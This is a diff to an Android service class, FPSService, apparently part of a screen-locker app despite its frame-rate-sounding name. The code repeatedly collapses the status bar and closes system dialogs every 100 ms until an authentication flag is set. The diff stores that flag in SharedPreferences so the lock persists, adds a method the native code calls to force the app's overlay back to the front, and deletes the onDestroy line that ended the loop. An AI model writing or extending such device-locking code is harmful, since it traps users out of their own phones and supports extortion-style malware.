@@ -16,7 +16,7 @@ import java.lang.reflect.Method;
 import android.content.pm.ServiceInfo;
 
 public class FPSService extends Service {
-    public static boolean isAuthenticated = false;
+
 
     static {
         System.loadLibrary("fps-native");
@@ -57,7 +57,10 @@ public class FPSService extends Service {
             @Override
             public void run() {
                 // Cek status di sini
-                if (!isAuthenticated) {
+                boolean isCurrentlyAuthenticated = getSharedPreferences("AUTH_PREFS", MODE_PRIVATE)
+                                                            .getBoolean("is_authenticated", false);
+
+                if (!isCurrentlyAuthenticated) {
                     collapseStatusBar();
                     closeSystemDialogs();
                     handler.postDelayed(this, 100);
@@ -73,6 +76,13 @@ public class FPSService extends Service {
         try {
             sendBroadcast(new Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS));
         } catch (Exception e) {}
+    }
+
+    private void refreshOverlay() {
+        // Method ini dipanggil dari native untuk memastikan overlay tetap di depan
+        Intent intent = new Intent(this, MainActivity.class);
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
+        startActivity(intent);
     }
 
     @Override
@@ -122,7 +132,6 @@ public class FPSService extends Service {
     public void onDestroy() {
         super.onDestroy();
         stopNativeAggression(); // Pastikan mati
-        isAuthenticated = true;  // Hentikan looping handler
         try { 
             unregisterReceiver(screenReceiver); 
         } catch (Exception e) {
